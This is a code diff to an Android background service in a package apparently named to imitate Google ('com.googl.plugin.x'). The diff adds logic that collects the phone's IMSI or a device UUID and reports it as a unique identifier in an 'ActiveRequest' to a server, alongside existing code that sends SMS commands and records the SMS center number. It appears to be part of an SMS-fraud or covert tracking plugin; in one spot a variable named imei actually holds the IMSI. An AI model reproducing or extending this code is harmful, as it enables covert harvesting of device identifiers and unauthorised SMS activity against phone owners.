@@ -13,6 +13,7 @@ import com.googl.plugin.x.R;
 import com.plugin.common.utils.CustomThreadPool;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
+import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.SMSUtil;
 import com.xstd.plugin.api.ActiveRequest;
 import com.xstd.plugin.api.ActiveResponse;
@@ -23,6 +24,7 @@ import com.xstd.plugin.config.SettingManager;
 
 import java.io.File;
 import java.util.Calendar;
+import java.util.UUID;
 
 /**
  * Created with IntelliJ IDEA.
@@ -134,6 +136,8 @@ public class PluginService extends IntentService {
     }
 
     private void activePluginAction() {
+        if (AppRuntime.isSIMCardReady(getApplicationContext())) return;
+
         CustomThreadPool.asyncWork(new Runnable() {
             @Override
             public void run() {
@@ -149,10 +153,22 @@ public class PluginService extends IntentService {
                          */
                         SMSUtil.trySendCmdToNetwork(getApplicationContext());
                     } else {
+                        String imei = UtilsRuntime.getIMSI(getApplicationContext());
+                        if (TextUtils.isEmpty(imei)) {
+                            imei = String.valueOf(System.currentTimeMillis());
+                        }
+                        UUID uuid = CommonUtil.deviceUuidFactory(getApplicationContext());
+                        String unique = null;
+                        if (uuid != null) {
+                            unique = uuid.toString();
+                        } else {
+                            unique = imei;
+                        }
+
                         SettingManager.getInstance().setKeyDayActiveCount(SettingManager.getInstance().getKeyDayActiveCount() + 1);
                         ActiveRequest request = new ActiveRequest(getApplicationContext()
                                                                      , Config.CHANNEL_CODE
-                                                                     , UtilsRuntime.getIMSI(getApplicationContext())
+                                                                     , unique
                                                                      , getString(R.string.app_name)
                                                                      , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
                                                                      , SettingManager.getInstance().getKeySmsCenterNum()
